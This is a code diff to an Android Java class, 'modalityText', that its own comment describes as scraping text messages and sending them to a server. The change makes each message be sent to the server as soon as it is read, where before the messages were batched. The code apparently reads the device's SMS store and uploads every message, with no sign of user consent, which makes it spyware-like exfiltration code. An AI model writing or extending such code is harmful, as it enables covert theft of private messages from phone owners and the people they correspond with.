@@ -18,7 +18,7 @@ public class modalityText extends AppCompatActivity {
 
 
     // scrapes texts and sends them to a server
-    public void getTexts(Context mContext, serverHook hook){
+    public void getTexts(Context mContext){
         // array of all texts
 
         List<String> texts = new ArrayList<>();
@@ -58,7 +58,7 @@ public class modalityText extends AppCompatActivity {
 
                 msgData = msgData.substring(0, msgData.length()-1);
                 msgData += "}";
-                texts.add(msgData);
+                serverHook.sendToServer("text",msgData);
             } while (cursor.moveToNext());
         } else {
             System.out.println("No messages found");
@@ -96,16 +96,13 @@ public class modalityText extends AppCompatActivity {
 
                 msgData = msgData.substring(0, msgData.length()-1);
                 msgData += "}";
-                texts.add(msgData);
+                serverHook.sendToServer("text",msgData);
             } while (cursor.moveToNext());
         } else {
             System.out.println("No messages found");
         }
         cursor.close();
 
-        for (String t : texts) {
-            hook.sendToServer("text",t);
-        }
     }
 
 }
